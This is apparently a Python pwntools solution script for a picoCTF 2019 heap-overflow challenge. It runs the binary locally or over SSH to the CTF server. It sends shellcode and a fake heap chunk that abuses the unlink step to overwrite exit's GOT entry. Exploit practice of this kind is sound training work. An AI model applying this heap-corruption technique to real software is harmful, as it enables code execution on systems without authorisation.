import binascii
from pwn import *
import sys
from struct import pack

BINARY = './vuln'
context.terminal = ['tmux', 'splitw', '-h']


def attach_gdb(sh):
    gdb.attach(sh)


def P32(v):
    return pack('I', v)


def P64(v):
    return pack('Q', v)


def deHex(v):
    return binascii.unhexlify(v)[::-1]


def start():

    if args["REMOTE"]:
        s = ssh(host='2019shell1.picoctf.com',
                user='mikon',
                password="password")
        sh = s.process(
            'vuln',
            cwd='/problems/heap-overflow_1_3f101d883699357e88af6bd1165695cd')
    else:
        sh = process('./vuln', stdout=process.PTY, stdin=process.PTY)

    if args["GDB"]:
        attach_gdb(sh)
    return sh


'''
struct chunk {
    int prev_size;
    int size;
    struct chunk *fd;  // forward pointer
    struct chunk *bk;  // backward pointer
};

*(next->fd + 12) = next->bk
*(next->bk+ 8) = next->fd

'''


def main():
    sh = start()

    exitGot = 0x804d02C
    sh.recvline()
    leak = sh.recvline()
    leak = int(leak)
    print(hex(leak))
    payload1 = 'a' * 8
    payload1 += asm('mov eax, 0x8048936;call eax;')

    # fake chunk
    payload2 = 'a' * (72 - 8)
    payload2 += P32(72)
    payload2 += P32(0x87)
    payload2 += P32(exitGot - 0xc)
    payload2 += P32(leak + 8)

    sh.sendlineafter('fullname\n', payload1)

    sh.sendlineafter('lastname\n', payload2)

    sh.interactive()


if __name__ == '__main__':
    main()
